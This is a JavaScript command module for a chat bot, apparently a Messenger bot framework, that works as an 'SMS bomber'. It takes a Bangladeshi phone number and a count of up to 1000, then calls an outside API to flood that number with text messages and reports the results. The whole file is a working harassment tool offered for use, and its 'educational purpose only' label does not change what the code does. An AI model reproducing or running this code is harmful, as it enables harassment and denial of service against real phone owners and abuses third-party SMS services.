const axios = require('axios');

module.exports = {
  config: {
    name: "bomber",
    version: "2.1",
    author: "Daraz",
    countDown: 5,
    role: 0,
    shortDescription: "SMS bombing tool",
    longDescription: "Send multiple SMS to a target number (Educational purpose only)",
    category: "Tools",
    guide: {
      en: "{pn} <number> <count>\nExample: {pn} 01912345678 100"
    },
    aliases: ["smsbomb", "sbomb"]
  },

  onStart: async function({ api, event, args, message }) {
    try {
      if (args.length < 2) {
        return this.showHelp(message);
      }

      const number = args[0];
      const count = parseInt(args[1]);

      if (!this.isValidBangladeshiNumber(number)) {
        return message.reply(
          `❌ 𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐍𝐔𝐌𝐁𝐄𝐑\n` +
          `📱 𝐅𝐨𝐫𝐦𝐚𝐭: 01XXXXXXXXX\n` +
          `💡 𝐄𝐱𝐚𝐦𝐩𝐥𝐞: 01912345678`
        );
      }

      if (isNaN(count) || count < 1 || count > 1000) {
        return message.reply(
          `❌ 𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐂𝐎𝐔𝐍𝐓\n` +
          `📊 𝐑𝐚𝐧𝐠𝐞: 1-1000\n` +
          `💡 𝐄𝐱𝐚𝐦𝐩𝐥𝐞: 100`
        );
      }

      // 1. PROCESSING MESSAGE
      const processingMsg = await message.reply(
        `╭━━━━━━━━━━━━━╮\n` +
        `⚡ 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 ⚡\n` +
        `╰━━━━━━━━━━━━━╯\n\n` +
        `📞 𝐓𝐚𝐫𝐠𝐞𝐭 : ${number}\n` +
        `🎯 𝐂𝐨𝐮𝐧𝐭 : ${count}\n` +
        `📡 𝐒𝐭𝐚𝐭𝐮𝐬 : ⏳ 𝐏𝐫𝐨𝐜𝐞𝐬𝐢𝐧𝐠...\n` +
        `⏰ 𝐓𝐢𝐦𝐞 : ${new Date().toLocaleTimeString()}\n\n` +
        `𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐰𝐡𝐢𝐥𝐞 𝐰𝐞 𝐬𝐞𝐧𝐝 𝐒𝐌𝐒...`
      );

      // 2. CALL API
      const result = await this.sendSMSBomb(number, count);

      if (!result.success) {
        // EDIT TO FAILED
        return await api.editMessage(
          `╭━━━━━━━━━━━━━╮\n` +
          `❌ 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐈𝐍𝐆 𝐅𝐀𝐈𝐋𝐄𝐃 ❌\n` +
          `╰━━━━━━━━━━━━━━━━━━━━━╯\n\n` +
          `📞 𝐓𝐚𝐫𝐠𝐞𝐭 : ${number}\n` +
          `🎯 𝐂𝐨𝐮𝐧𝐭 : ${count}\n` +
          `📡 𝐒𝐭𝐚𝐭𝐮𝐬 : 𝐅𝐀𝐈𝐋𝐄𝐃\n` +
          `⚠️ 𝐑𝐞𝐚𝐬𝐨𝐧 : ${result.error || "Unknown error"}\n\n` +
          `𝐏𝐥𝐞𝐚𝐬𝐞 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧 𝐥𝐚𝐭𝐞𝐫`,
          processingMsg.messageID
        );
      }

      // 3. EDIT TO SUCCESS WITH RESULTS
      const summary = result.data.summary;
      await api.editMessage(
        this.formatResults(summary, result.data),
        processingMsg.messageID
      );

    } catch (error) {
      console.error("SMB error:", error);
      await message.reply(`❌ 𝐄𝐑𝐑𝐎𝐑: ${error.message}`);
    }
  },

  async sendSMSBomb(number, count) {
    try {
      const apiUrl = `https://shadowx-api.onrender.com/api/bm?num=${number}&count=${count}`;
      console.log(`📱 Calling SMB API: ${apiUrl}`);
      const response = await axios.get(apiUrl, {
        timeout: 1200000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });
      const data = response.data;
      if (!data.success) {
        return { success: false, error: data.message || "API failed" };
      }
      return { success: true, data: data };
    } catch (error) {
      console.error("SMB API error:", error.message);
      return { success: false, error: error.message || "Network error" };
    }
  },

  formatResults(summary, fullData) {
    let text = `╭━━━━━━━━━━━━━╮\n`;
    text += `✅ 𝐒𝐌𝐒 𝐑𝐄𝐏𝐎𝐑𝐓 𝐒𝐔𝐂𝐄𝐒 ✅\n`;
    text += `╰━━━━━━━━━━━━━━━━━━━━━╯\n\n`;
    text += `📞 𝐓𝐚𝐫𝐠𝐞𝐭 : ${summary.target}\n`;
    text += `🎯 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 : ${summary.requested}\n`;
    text += `✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥 : ${summary.successful}\n`;
    text += `❌ 𝐅𝐚𝐢𝐥𝐞𝐝 : ${summary.failed}\n`;
    text += `📊 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞 : ${summary.success_rate_percent}%\n\n`;
    text += `⏱️ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧 : ${summary.duration_formatted}\n`;
    text += `🔄 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐞𝐦𝐩𝐭𝐬: ${summary.total_attempts}\n`;
    text += `⚡ 𝐀𝐏𝐈𝐬 𝐔𝐬𝐞𝐝 : ${summary.apis_used}\n`;
    if (summary.average_time_per_message) {
      text += `⏰ 𝐀𝐯𝐠 𝐓𝐢𝐦𝐞 : ${summary.average_time_per_message}ms\n\n`;
    } else {
      text += `\n`;
    }
    text += `📅 𝐒𝐭𝐚𝐫𝐭 : ${new Date(summary.start_time).toLocaleTimeString()}\n`;
    text += `📅 𝐄𝐧𝐝 : ${new Date(summary.end_time).toLocaleTimeString()}\n\n`;
    text += `⚠️ 𝐍𝐨𝐭𝐞 : Educational purposes only\n`;
    text += `🤖 𝐀𝐏𝐈 : 4x-API\n`;
    text += `👨‍💻 𝐃𝐞𝐯 : Zihad Ahmed`;
    return text;
  },

  isValidBangladeshiNumber(number) {
    if (typeof number!== 'string') return false;
    const cleanNumber = number.replace(/[^\d]/g, '');
    if (cleanNumber.length!== 11) return false;
    if (!cleanNumber.startsWith('01')) return false;
    const thirdDigit = parseInt(cleanNumber[2]);
    if (thirdDigit < 3 || thirdDigit > 9) return false;
    return true;
  },

  showHelp(message) {
    const helpText =
`╭━━━━━━━━━━━━━╮
📱 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 𝐓𝐎𝐎𝐋
╰━━━━━━━━━━━━━╯

📝 𝐔𝐬𝐚𝐠𝐞:
• ${this.config.name} <number> <count>
• ${this.config.name} 01912345678 100

⚠️ 𝐋𝐢𝐦𝐢𝐭𝐬:
• Number: Bangladeshi 01XXXXXXXXX
• Count: 1-1000 max
• Educational purpose only
`;
    return message.reply(helpText);
  }
};
